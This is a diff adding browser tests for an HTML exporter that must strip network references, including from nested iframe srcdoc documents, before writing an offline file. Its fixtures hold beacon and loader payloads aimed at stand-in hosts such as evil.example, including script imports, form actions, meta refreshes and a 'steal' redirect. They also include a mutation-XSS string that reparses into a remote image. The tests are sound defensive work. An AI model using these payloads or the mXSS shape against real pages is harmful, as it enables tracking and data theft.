@@ -2823,6 +2823,274 @@ test("CMH-OFFLINE-04: hyperlink auditing and an SVG feImage are stripped from an
   }
 });
 
+const SRCDOC_NESTED = [
+  "<h1>Nested document</h1>",
+  '<p id="cmh-srcdoc-keep">This nested paragraph is content and must survive.</p>',
+  // Every shape below is one the strip already neutralizes when it is written in the document
+  // directly, so what this case pins is that carrying it as an attribute VALUE no longer hides it.
+  '<img id="cmh-srcdoc-img" src="https://evil.example/nested.png" alt="x">',
+  '<script src="https://evil.example/nested.js"></script>',
+  // An SVG script loads through `href`/`xlink:href` and has no body for a text scan to read.
+  '<svg><script href="https://evil.example/nested-svg.js"></script></svg>',
+  // The only non-local base in the whole document, so the toast count below proves the nested
+  // strip's findings are added to the enclosing export's rather than counted separately.
+  '<base id="cmh-srcdoc-base" href="https:evil.example/rebased/">',
+  '<video poster="https://evil.example/nested-poster.png"></video>',
+  '<form action="https://evil.example/collect"><button>go</button></form>',
+  '<meta http-equiv="refresh" content="0;url=https://evil.example/refresh">',
+  '<button onclick="location.href=\'https://evil.example/handler\'">go</button>',
+  '<script>import("https://evil.example/nested-import.js");</script>',
+  '<style>@import "https://evil.example/nested.css";</style>',
+  '<p style="background:url(https://evil.example/nested-bg.png)">styled</p>',
+].join("\n");
+
+function asSrcdoc(markup) {
+  return markup.replace(/&/g, "&amp;").replace(/"/g, "&quot;")
+    .replace(/</g, "&lt;").replace(/>/g, "&gt;");
+}
+
+const SRCDOC_CONTENT = [
+  "<h1>Iframe srcdoc</h1>",
+  '<p id="srcdoc-note">An iframe srcdoc carries a whole document as an attribute value.</p>',
+  // A srcdoc document can carry its own srcdoc, so the outer one here wraps the nested document
+  // above in a SECOND level: the strip has to recurse or the inner level rides through untouched.
+  '<iframe id="cmh-srcdoc-outer" title="outer" srcdoc="'
+    + asSrcdoc('<p id="cmh-srcdoc-mid">middle</p><iframe id="cmh-srcdoc-inner" title="inner" srcdoc="'
+      + asSrcdoc(SRCDOC_NESTED) + '"></iframe>') + '"></iframe>',
+  // ...and no further: a srcdoc that loads nothing is content, so it must survive INTACT - byte for
+  // byte, since a strip that re-serialized every srcdoc would churn markup it had no reason to touch.
+  '<iframe id="cmh-srcdoc-keep-frame" title="keep" srcdoc="'
+    + asSrcdoc('<p id="cmh-srcdoc-benign">nothing to strip here</p>') + '"></iframe>',
+].join("\n");
+
+test("CMH-OFFLINE-04: a document carried in an iframe srcdoc is stripped like any other, at every depth", async ({ page, browser }) => {
+  test.setTimeout(90000);
+  const staged = stageContent(SRCDOC_CONTENT, { key: "cmh-offline-srcdoc", source: "offline-srcdoc.html" });
+  const outDir = makeTmpDir();
+  let ctx2;
+  let ctx3;
+  try {
+    await page.route(/^https?:\/\//, (route) => route.abort());
+    await installDownloadTextCapture(page);
+    await page.goto(fileUrl(staged.html));
+    await ready(page);
+    // The bug, pinned on the SOURCE document: the nested document really is a live browsing
+    // context that really does request the beacon.
+    expect(await page.evaluate(() => {
+      const outer = document.getElementById("cmh-srcdoc-outer").contentDocument;
+      const inner = outer.getElementById("cmh-srcdoc-inner").contentDocument;
+      return inner.getElementById("cmh-srcdoc-img").src;
+    })).toContain("evil.example");
+
+    await openToolbarMenu(page);
+    await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    const exportedHtml = await capturedDownloadText(page);
+
+    expect(exportedHtml, "no nested reference may survive, at any depth").not.toContain("evil.example");
+    // Sanitized, not deleted: the srcdoc attribute and the nested document's own content stay.
+    expect(exportedHtml).toContain('id="cmh-srcdoc-outer"');
+    expect(exportedHtml).toContain("cmh-srcdoc-mid");
+    expect(exportedHtml).toContain("cmh-srcdoc-keep");
+    expect(exportedHtml).toMatch(/id="cmh-srcdoc-outer"[^>]*\bsrcdoc=/);
+    // A clean srcdoc is left exactly as the author wrote it rather than re-serialized.
+    expect(exportedHtml).toContain('srcdoc="' + asSrcdoc('<p id="cmh-srcdoc-benign">nothing to strip here</p>') + '"');
+    // The nested findings are the ENCLOSING export's findings: the one base cleared in this
+    // document is the one buried two srcdoc levels deep.
+    await expect(page.locator("#toast")).toContainText(
+      "1 <base href> pointing away from this file was cleared, so relative references and links now resolve beside the file.");
+
+    const exportedPath = path.join(outDir, "offline-srcdoc.html");
+    fs.writeFileSync(exportedPath, exportedHtml);
+    // The gate must agree with the strip: a file the exporter cleans is offline-clean to --strict.
+    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
+    // ...and the other direction, which a clean file alone cannot prove: re-inject a srcdoc into
+    // the EXPORTED file and the gate must reject it, so a hand-authored offline document cannot
+    // keep what the strip takes away.
+    const reinjectedPath = path.join(outDir, "offline-srcdoc-reinjected.html");
+    const reinjectedHtml = exportedHtml.replace(
+      '<p id="srcdoc-note">',
+      '<iframe id="cmh-srcdoc-reinjected" title="re" srcdoc="'
+      + asSrcdoc('<img src="https://evil.example/reinjected.png" alt="x">') + '"></iframe><p id="srcdoc-note">');
+    expect(reinjectedHtml, "the srcdoc must actually have been re-injected").not.toEqual(exportedHtml);
+    fs.writeFileSync(reinjectedPath, reinjectedHtml);
+    // Pinned to the SRCDOC rule rather than merely to a non-zero exit, so a future rule that
+    // rejected this file for an unrelated reason could not stand in for the check under test.
+    let reinjectedFailure = null;
+    try {
+      execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", reinjectedPath], { cwd: SKILL, stdio: "pipe" });
+    } catch (err) {
+      reinjectedFailure = String(err.stdout || "") + String(err.stderr || "");
+    }
+    expect(reinjectedFailure, "--strict must reject a re-injected srcdoc").not.toBeNull();
+    expect(reinjectedFailure).toContain("inside an <iframe srcdoc>:");
+    expect(reinjectedFailure).toContain("evil.example/reinjected.png");
+
+    ctx2 = await browser.newContext();
+    const page2 = await ctx2.newPage();
+    const external = [];
+    await page2.route(/^https?:\/\//, async (route) => {
+      external.push(route.request().url());
+      await route.abort();
+    });
+    await page2.goto(fileUrl(exportedPath));
+    await ready(page2);
+    expect(external).toEqual([]);
+
+    // The strip is the layer that must not DEPEND on the CSP, so prove it alone: the same export
+    // with its zero-network policy removed must still make no request from the nested context.
+    const noCspPath = path.join(outDir, "offline-srcdoc-no-csp.html");
+    const cspMetaRe = /<meta\b[^>]*http-equiv=["']Content-Security-Policy["'][^>]*>/gi;
+    expect((exportedHtml.match(cspMetaRe) || []).length, "the export must carry a CSP meta").toBeGreaterThan(0);
+    const noCspHtml = exportedHtml.replace(cspMetaRe, "");
+    expect(noCspHtml.match(cspMetaRe), "every CSP meta must actually have been removed").toBeNull();
+    fs.writeFileSync(noCspPath, noCspHtml);
+    ctx3 = await browser.newContext();
+    const page3 = await ctx3.newPage();
+    const externalNoCsp = [];
+    await page3.route(/^https?:\/\//, async (route) => {
+      externalNoCsp.push(route.request().url());
+      await route.abort();
+    });
+    await page3.goto(fileUrl(noCspPath));
+    await ready(page3);
+    // The nested context is live in this copy, so read through it: the beacon must be gone rather
+    // than merely blocked, and the nested paragraph must still be there to read.
+    expect(await page3.evaluate(() => {
+      const outer = document.getElementById("cmh-srcdoc-outer").contentDocument;
+      const inner = outer.getElementById("cmh-srcdoc-inner").contentDocument;
+      return {
+        img: (inner.getElementById("cmh-srcdoc-img") || {}).src || "",
+        base: inner.baseURI,
+        kept: !!inner.getElementById("cmh-srcdoc-keep"),
+      };
+    })).toEqual({ img: expect.not.stringContaining("evil.example"), base: expect.not.stringContaining("evil.example"), kept: true });
+    expect(externalNoCsp).toEqual([]);
+  } finally {
+    if (ctx2) await ctx2.close();
+    if (ctx3) await ctx3.close();
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+    fs.rmSync(outDir, { recursive: true, force: true });
+  }
+});
+
+function nestSrcdoc(inner, levels) {
+  // Markup whose DEEPEST srcdoc sits `levels` deep, counting the outermost iframe (written into
+  // the enclosing document) as level 1 - the same counting both the strip and the gate use.
+  let markup = inner;
+  for (let i = 0; i < levels; i += 1) {
+    markup = '<iframe title="n' + i + '" srcdoc="' + asSrcdoc(markup) + '"></iframe>';
+  }
+  return markup;
+}
+
+// A classic mutation-XSS shape: in the DOM the remote `img` is only TEXT inside a `title`
+// attribute, so the strip has nothing to remove - but serialize-then-reparse crosses a
+// foreign-content boundary where the comment ends somewhere else, and the reparse can MATERIALIZE
+// the `img` as a real element. The trailing handler is what forces a rewrite at all (the strip
+// scrubs it), which is the only way the round-trip happens.
+const SRCDOC_MUTATION = '<math><mtext><table><mglyph><style><!--</style>'
+  + '<img title="--><img src=https://mxss.example/leak.png>">'
+  + '<p onclick="ignored">forces a rewrite</p>';
+
+const SRCDOC_BOUNDARY_CONTENT = [
+  "<h1>Nested srcdoc boundaries</h1>",
+  '<p id="boundary-note">The depth bound, the doctype, and the serialization fixed point.</p>',
+  // AT the bound: still read, so its egress is stripped and its content survives.
+  '<iframe id="cmh-srcdoc-at-bound" title="at" srcdoc="'
+    + asSrcdoc(nestSrcdoc('<p>cmh-depth-at-bound-marker</p>'
+      + '<img src="https://evil.example/at-bound.png" alt="x">', 7)) + '"></iframe>',
+  // PAST it: neither side reads that far, so the whole attribute goes rather than shipping markup
+  // the export did not analyze - and the toast says so.
+  '<iframe id="cmh-srcdoc-past-bound" title="past" srcdoc="'
+    + asSrcdoc(nestSrcdoc('<p>cmh-depth-past-bound-marker</p>'
+      + '<img src="https://evil.example/past-bound.png" alt="x">', 8)) + '"></iframe>',
+  // A doctype is a SIBLING of documentElement, so a write-back that serialized the element alone
+  // would drop it and flip this nested context into quirks mode.
+  '<iframe id="cmh-srcdoc-doctype" title="dt" srcdoc="'
+    + asSrcdoc('<!DOCTYPE html><html><head><title>t</title></head><body>'
+      + '<p>cmh-doctype-marker</p><img src="https://evil.example/doctype.png" alt="x">'
+      + "</body></html>") + '"></iframe>',
+  '<iframe id="cmh-srcdoc-mutation" title="mx" srcdoc="' + asSrcdoc(SRCDOC_MUTATION) + '"></iframe>',
+].join("\n");
+
+test("CMH-OFFLINE-04: the srcdoc strip stops at the shared bound, keeps the doctype, and settles", async ({ page, browser }) => {
+  test.setTimeout(90000);
+  const staged = stageContent(SRCDOC_BOUNDARY_CONTENT, { key: "cmh-offline-srcdoc-bounds", source: "offline-srcdoc-bounds.html" });
+  const outDir = makeTmpDir();
+  let ctx2;
+  try {
+    await page.route(/^https?:\/\//, (route) => route.abort());
+    await installDownloadTextCapture(page);
+    await page.goto(fileUrl(staged.html));
+    await ready(page);
+    await openToolbarMenu(page);
+    await Promise.all([
+      page.waitForEvent("download"),
+      page.locator("#btnExportOfflineTop").click(),
+    ]);
+    const exportedHtml = await capturedDownloadText(page);
+
+    expect(exportedHtml, "no nested reference may survive at any depth the strip reads")
+      .not.toContain("evil.example");
+    // The bound is a bound on both sides, not an off-by-one: the document AT it is still read (so
+    // its content is kept and only its egress is taken), and the one PAST it is gone entirely.
+    expect(exportedHtml).toContain("cmh-depth-at-bound-marker");
+    expect(exportedHtml).not.toContain("cmh-depth-past-bound-marker");
+    expect(exportedHtml).toMatch(/id="cmh-srcdoc-at-bound"[^>]*\bsrcdoc=/);
+    // Only the level PAST the bound goes: the outer frames of that same chain are still read, so
+    // they keep their srcdoc, and it is the innermost document that disappears.
+    expect(exportedHtml).toMatch(/id="cmh-srcdoc-past-bound"[^>]*\bsrcdoc=/);
+    // Deleting a whole nested document is never silent.
+    await expect(page.locator("#toast")).toContainText(
+      "1 <iframe srcdoc> document was removed because it was nested too deep to check, or would not settle into markup a browser reparses unchanged.");
+    // A rewritten srcdoc keeps its doctype, so the nested context stays out of quirks mode.
+    expect(exportedHtml).toContain("cmh-doctype-marker");
+    expect(exportedHtml).toMatch(/id="cmh-srcdoc-doctype"[^>]*srcdoc="&lt;!DOCTYPE html&gt;/i);
+
+    const exportedPath = path.join(outDir, "offline-srcdoc-bounds.html");
+    fs.writeFileSync(exportedPath, exportedHtml);
+    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });
+
+    // The strip cleans a DOM, but what a browser parses is the STRING it wrote. Prove the string
+    // is the clean thing, with the zero-network policy removed so nothing but the strip is left to
+    // credit: the mutation shape must not reparse into a live loader, and the doctype frame must
+    // really be in standards mode.
+    const noCspPath = path.join(outDir, "offline-srcdoc-bounds-no-csp.html");
+    const cspMetaRe = /<meta\b[^>]*http-equiv=["']Content-Security-Policy["'][^>]*>/gi;
+    expect((exportedHtml.match(cspMetaRe) || []).length, "the export must carry a CSP meta").toBeGreaterThan(0);
+    const noCspHtml = exportedHtml.replace(cspMetaRe, "");
+    expect(noCspHtml.match(cspMetaRe), "every CSP meta must actually have been removed").toBeNull();
+    fs.writeFileSync(noCspPath, noCspHtml);
+    ctx2 = await browser.newContext();
+    const page2 = await ctx2.newPage();
+    const external = [];
+    await page2.route(/^https?:\/\//, async (route) => {
+      external.push(route.request().url());
+      await route.abort();
+    });
+    await page2.goto(fileUrl(noCspPath));
+    await ready(page2);
+    expect(await page2.evaluate(() => {
+      const mx = document.getElementById("cmh-srcdoc-mutation").contentDocument;
+      const dt = document.getElementById("cmh-srcdoc-doctype").contentDocument;
+      return {
+        network: Array.from(mx.querySelectorAll("[src]"))
+          .map((el) => el.getAttribute("src") || "")
+          .filter((v) => /^(?:https?:)?\/\//i.test(v)),
+        mode: dt.compatMode,
+      };
+    })).toEqual({ network: [], mode: "CSS1Compat" });
+    expect(external).toEqual([]);
+  } finally {
+    if (ctx2) await ctx2.close();
+    fs.rmSync(staged.dir, { recursive: true, force: true });
+    fs.rmSync(outDir, { recursive: true, force: true });
+  }
+});
+
 const QUOTED_EGRESS_NOTE = 'Please drop the import("https://evil.example/x.js") loader and the '
   + 'location.href = "https://evil.example/steal" beacon before we ship this.';
 
